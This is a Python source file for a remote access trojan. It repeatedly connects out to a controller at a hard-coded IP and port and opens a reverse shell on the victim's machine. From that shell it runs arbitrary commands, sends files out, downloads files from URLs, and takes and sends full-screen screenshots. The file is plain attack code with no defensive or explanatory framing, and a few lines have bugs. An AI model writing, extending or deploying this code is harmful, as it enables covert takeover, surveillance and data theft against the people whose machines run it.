import socket, subprocess, shutil, os, urllib.request, mss

IP = "192.168.1.107"
PORT = 1234

payload_dir = str(os.path.dirname(os.path.realpath(__file__)))

def install_await(filename):
    file = open(filename, 'rb')
    file_data = file.read(1000000000)
    s.send(file_data)
    file.close()

while True:
    os.chdir(payload_dir)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connection = False
    while not connection:
        try:
            s.connect((IP, PORT))
            connection = True
        except Exception:
            pass

    while True:
        try:
            cmd = s.recv(1024).decode('utf-8')
        except:
            s.close()
            break
        
        if cmd == "exit":
            break

        elif cmd == "info -> os":
            s.send(os.name.encode('utf-8'))
            continue
        
        elif cmd == "info -> hostname":
            s.send(socket.gethostname().encode("utf-8"))
            continue

        elif cmd[:2] == "cd" and len(cmd) > 3:
            path = cmd[3:]
            try:
                os.chdir(path)
                s.send(" ".encode('utf-8'))
            except Exception as e:
                s.send("cd: {}: No such file or directory -> {}".format(path, e).encode('utf-8'))
            continue

        elif cmd[:5] == "mkdir" and len(cmd) > 5:
            folderName = cmd.split()[1]
            try:
                os.mkdir(folderName)
                s.send(" ".encode('utf-8'))
            except:
                s.send("mkdir: {}: A subdirectory or file Roaming already exists.".format(path).encode('utf-8'))
            continue

        elif cmd[:2] == "cp" and len(cmd) > 3:
            path = cmd[3:].split()
            try:
                shutil.copyfile(path[0], path[1])
                s.send(" ".encode('utf-8'))
            except:
                s.send("cp: {}: Unable to copy file.".format(path).encode('utf-8'))
            continue
        
        elif cmd[:7] == "install" and len(cmd) > 8:
            url = cmd[8:]
            file = url.split("/")[-1]
            try:
                urllib.request.urlretrieve(url, file)
                continue
            except Exception as e:
                s.send(f"[-] Unable to install, -> {e}".encode('utf-8'))
                continue
        
        elif cmd[:8] == "download" and len(cmd) > 9:
            try:
                filename = cmd.split()[1]
                if os.path.exists(f"{os.getcwd()}\\{filename}") == False:
                    s.send("[-] File doesn't exist".encode('utf-8'))
                    break
                install_await(filename)
            except Exception as e:
                s.send(f"[-] Unable to download, -> {e}".encode('utf-8'))
            continue
        
        elif cmd == "screenshot":
            try:
                with mss() as sct:
                    filename = sct.shot(mon=-1, output='fullscreen.jpg')
                install_await(filename)
                os.remove(filename)
            except Exception as e:
                s.send(f"[-] Failed to screenshot and send file, {e}".encode('utf-8'))
            continue

        proc = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output = proc.stdout.read() + proc.stderr.read()
        if len(output) == 0:
            output = " "
        try:
            output = output.encode('utf-8')
        except:
            pass

        s.send(output)

s.close()
